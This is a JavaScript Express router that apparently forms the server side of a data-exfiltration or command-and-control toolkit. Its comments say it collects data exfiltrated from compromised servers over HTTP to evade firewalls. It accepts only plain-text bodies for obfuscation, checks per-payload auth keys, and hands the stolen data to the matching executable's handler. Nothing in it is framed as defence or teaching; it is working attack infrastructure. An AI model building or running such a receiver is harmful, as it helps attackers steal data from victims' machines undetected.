const express = require('express');
const EXE_DATAS = require("./exe_datas.js");
const Auth = require("./auth.js");
const { genAsciiStr } = require("./util.js");
const logging = require("./logging.js");

// This router will handle the POST requests that are usually used to exfiltrate data from a server
// Basically, exfiltration via HTTP since that's less sus than TCP, and it'd be dumb for firewalls to block Port 80
const postReqRouter = express.Router({
    mergeParams: true
});

// Create a middleware that checks for authentication.
// This is the same setup as get_req.js
postReqRouter.post("*", (request, response, next) => {

    // For standardization, obfuscation, and security purposes, we're only going to take plain text requests
    if (request.headers['content-type'] != "text/plain")
    {
        logging.log(`🔨🚩 POST request from ${request.ip} of type ${request.headers.authorization} rejected for non-plain content type.`);
        response.status(400).end();
        return;
    }

    let authKey = Auth.postKeys.getWithHash(request.headers.authorization);
    
    if (authKey != null)
    {
        // If authorized, check if the authkey matches the POST type we are looking for
        if (authKey.usage == request.headers.exe)
        {
            // If authorized, invoke the EXE's POST function.
            // @see ./exe_datas.js
            
            EXE_DATAS[authKey.usage].postFunction(request);
            logging.log(`🔨 POST Function finished executing.`);
        }
        else
        {
            // If they differ, that means something went wrong. This is potentially a red flag
            logging.log(`🔨🚩 POST Request from ${request.ip} with requested key ${request.headers.authorization}\
            has mismatch between usage (${authKey.usage}) and requested POST EXE (${request.headers.exe}).`);
        }
    }
    else
    {
        // If unauthorized, determine whether it's due to a lack of AUTH code or a wrong auth code.
        if (request.headers.authorization == null)
        {
            logging.log(`🔨 Error: No POST request auth key provided by ${request.ip}`);
        }
        else
        {
            // Deliberately wrong auth code - might want to look into
            logging.log(`🔨🚩 Error in authenticating POST request from ${request.ip} using requested key - ${request.headers.authorization}.`);
        }
    }

    // End the response. No point in sending back random ASCII strings after this since it's a POST request.
    response.end();
});

module.exports = postReqRouter;